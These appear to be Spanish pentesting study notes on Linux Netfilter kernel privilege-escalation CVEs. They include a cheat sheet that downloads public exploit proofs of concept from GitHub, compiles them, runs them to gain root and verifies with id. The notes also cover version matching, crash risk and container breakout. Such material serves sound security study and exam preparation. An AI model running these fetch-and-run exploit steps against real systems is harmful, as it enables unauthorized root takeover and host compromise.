---
tags:
  - linux
  - privex
  - kernel
  - cve
---
## Conceptos Clave (TL;DR)

- **Netfilter** es un módulo del kernel de Linux responsable del filtrado de paquetes, NAT y connection tracking. Es la capa de software sobre la que actúan herramientas como `iptables` y `arptables`. Sus tres funciones principales son: defragmentación de paquetes, connection tracking y NAT.
- Entre 2021 y 2023 se descubrieron varias vulnerabilidades críticas en Netfilter (corrupción de memoria, heap OOB write y Use-After-Free) que permiten **escalada de privilegios local a root** desde un usuario sin privilegios.
- Muchas empresas corren kernels antiguos/sin parchear en producción porque su software depende de una versión concreta del sistema, lo que mantiene estos vectores vigentes durante años.
- **Relevante para contenedores:** Docker y las VMs comparten el kernel del host. Un exploit de kernel exitoso puede servir como vector de container breakout hacia el sistema anfitrión.

## Herramientas Clave

- `uname -r` -> Mostrar la versión exacta del kernel (release). Es el primer paso obligatorio: cada CVE solo afecta a rangos de versión muy concretos.
- `wget` / `git clone` -> Descargar/clonar el código del PoC (Proof-of-Concept) al sistema objetivo.
- `gcc` -> Compilar los exploits en C. Cada CVE requiere flags distintos (arquitectura, librerías).
- `make` -> Compilar exploits que incluyen un Makefile propio (CVE-2022-25636).

## Metodología Paso a Paso

**Pre-requisito:** Ya dispones de una shell como usuario sin privilegios sobre el host Linux (fase de post-explotación). El objetivo es LPE hasta `uid=0`.

1. **Enumeración del kernel.** Ejecutar `uname -r`. Lógica: los kernel exploits son extremadamente sensibles a la versión; ejecutar el PoC equivocado falla o, peor, tumba el sistema.
2. **Mapeo CVE <-> versión.** Comparar la versión obtenida contra los rangos vulnerables conocidos (ver tabla en Gotchas). Solo lanzar un exploit si la versión cae dentro del rango.
3. **Transferencia del PoC.** Descargar el exploit al target con `wget` (single file) o `git clone` (repos completos con Makefile/dependencias).
4. **Compilación.** Compilar con los flags exactos que pide cada PoC (arquitectura 32-bit, enlazado estático, librerías de Netfilter). Si faltan librerías de desarrollo, instalarlas antes.
5. **Ejecución y verificación.** Ejecutar el binario localmente y confirmar el éxito con `id` esperando `uid=0(root)`. Asumir siempre el riesgo de crash antes de lanzarlo.

## Cheat Sheet de Comandos

> NOTA: A diferencia de un ataque de red, estos comandos se ejecutan **localmente sobre el target ya comprometido**, por lo que no hay `<TARGET_IP>` que sustituir. Las únicas variables a validar son la **versión del kernel** y, opcionalmente, mirror/repo del PoC.

**Reconocimiento (común a todos los CVE)**
```bash
# Mostrar SOLO el "kernel release" (ej. 5.10.5-051005-generic).
# CRITICO: este valor determina que CVE es aplicable.
uname -r
```

**CVE-2021-22555 (kernel 2.6 - 5.11)**
```bash
# Descargar el PoC oficial de Google Security Research (un unico archivo .c)
wget https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c

# Compilar el exploit:
#   -m32    -> generar binario de 32 bits (requerido por este PoC)
#   -static -> enlazar todas las librerias DENTRO del binario (no depende de libs del target)
gcc -m32 -static exploit.c -o exploit

# Ejecutar el exploit localmente -> debe devolver shell root
./exploit

# Verificar que somos root (esperado: uid=0(root))
id
```

**CVE-2022-25636 (kernel 5.4 - 5.6.10)**
```bash
# Clonar el repositorio completo del PoC
git clone https://github.com/Bonfee/CVE-2022-25636.git
cd CVE-2022-25636

# Compilar usando el Makefile incluido en el repo
make

# Ejecutar (PELIGRO: puede corromper el kernel; ver Gotchas)
./exploit

# Verificar privilegios root
id
```

**CVE-2023-32233 (kernel hasta 6.3.1)**
```bash
# Clonar el repositorio del PoC
git clone https://github.com/Liuk3r/CVE-2023-32233
cd CVE-2023-32233

# Compilar enlazando manualmente las librerias de Netfilter:
#   -Wall   -> activar todos los warnings de compilacion
#   -o      -> nombre del binario de salida
#   -lmnl   -> enlazar libmnl (Minimalistic Netlink library)
#   -lnftnl -> enlazar libnftnl (libreria de nf_tables)
gcc -Wall -o exploit exploit.c -lmnl -lnftnl

# Ejecutar el exploit UAF contra los "anonymous sets" de nf_tables
./exploit

# Verificar root
id
```

## "Gotchas" y Troubleshooting

- **El matching de versión es lo más importante.** Tabla rápida de rangos vulnerables:
  - CVE-2021-22555 -> kernel 2.6 a 5.11
  - CVE-2022-25636 -> kernel 5.4 a 5.6.10
  - CVE-2023-32233 -> kernel hasta 6.3.1
- **CVE-2022-25636 puede corromper el kernel.** Tras ejecutarlo es probable que necesites reiniciar la máquina para volver a tener acceso. En un examen, lánzalo solo cuando estés seguro, porque puedes perder la conexión al objetivo. Además, el propio módulo muestra un `uname -r` de `5.13.0` (fuera del rango 5.4-5.6.10 indicado): no confíes en una sola fuente, valida el rango exacto en el repo del PoC antes de compilar.
- **Dependencias de compilación (CVE-2023-32233).** Necesita las librerías de desarrollo `libmnl` y `libnftnl`. Si `gcc` falla por símbolos no encontrados, instala los paquetes `-dev` correspondientes antes de recompilar (los flags `-lmnl -lnftnl` no sirven si las libs no están presentes).
- **CVE-2021-22555 requiere 32-bit estático.** Si omites `-m32 -static`, el binario puede no ejecutarse o no ser portable en el target. El `-static` evita depender de librerías que quizá no existan en la máquina víctima.
- **Inestabilidad general.** Todos estos exploits son potencialmente inestables y pueden romper el sistema. Prioriza siempre vectores de privesc menos destructivos (misconfigs, SUID, sudo, etc.) antes de recurrir a un kernel exploit.
- **Container breakout.** Si estás dentro de un Docker, recuerda que compartes el kernel con el host; un kernel exploit exitoso te escala en el host, no solo en el contenedor.